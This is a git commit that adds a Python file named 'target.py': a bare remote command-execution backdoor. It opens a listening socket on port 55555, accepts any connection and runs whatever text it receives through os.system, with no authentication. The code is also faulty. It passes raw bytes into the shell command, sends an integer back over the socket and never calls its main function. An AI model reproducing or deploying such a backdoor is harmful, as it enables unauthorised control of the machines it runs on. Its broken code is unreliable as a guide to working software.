b2542f6cb6f27b37d80e8a2dd16be0ed0b95bf78
Kr0dÿ <91196264+Retr0Kr0dy@users.noreply.github.com>
2021-12-28 10:09:46 +0100

    Create target.py

---
+++ py/madeherpreter/target.py
@@ -0,0 +1,44 @@
+__author__ = 'RetR0'
+
+import os
+import threading
+import socket
+
+host = (socket.gethostbyname(socket.gethostname()))
+
+port = int('55555')
+
+client_list = []
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((host, port))
+server.listen()
+
+def sending(response):
+    for client in client_list:
+        client.send(response)
+
+
+def command(it):
+    response = os.system(f'{it}')    
+    sending(response)
+
+def handle(client):
+    while True:
+        try:
+            it = client.recv(3072)
+            command(it)
+            
+        except:
+            print("Error")
+            server.close()
+
+def main():
+    while True:
+        client, address = server.accept()
+        client_list.append(client)
+        print (f"\nNew user connected at {address}")
+        thread = threading.Thread(target=handle, args=(client,))
+        thread.start()
+
+print(f"Server running on {host}, {port}")
